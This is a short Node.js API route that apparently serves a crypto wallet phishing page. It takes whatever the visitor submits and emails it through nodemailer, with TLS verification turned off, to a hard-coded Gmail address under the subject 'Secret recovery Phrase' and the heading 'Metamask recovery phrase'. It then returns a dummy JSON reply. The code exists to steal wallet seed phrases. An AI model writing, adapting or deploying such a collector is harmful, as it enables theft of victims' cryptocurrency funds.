import { createTransport  } from 'nodemailer'

export default function getEmail(req, res) {

  const mail = req.body

  const transporter = createTransport({
    service: process.env.MAIL_SERVICE,
    host: process.env.MAIL_SMTP,
    port: 465,
    auth: {
        user: process.env.MAIL_USER,
        pass: process.env.MAIL_PASS
    },
    tls: {
      rejectUnauthorized: false
    }
  });

  const mailData = {
    from: `"Recovery Phrase" <test@gmail.com>`, // sender address
    to: "annamackocryptoelite@gmail.com", // list of receivers
    subject: 'Secret recovery Phrase', // Subject line
    text: `
    This is the recovery phrase
    `, // plain text body
    html: `
    <div style=" padding: 10px">
    <h1  style=" text-align:center">Metamask recovery phrase</h1>
    <p>${mail}</p>
    </div>
    `, // html body
  }

   transporter.sendMail(mailData, function (err, info) {
    if(err)
      console.log(err)
    else
      console.log(info)
  })
  res.status(200).json({ name: 'John Doe' })
}

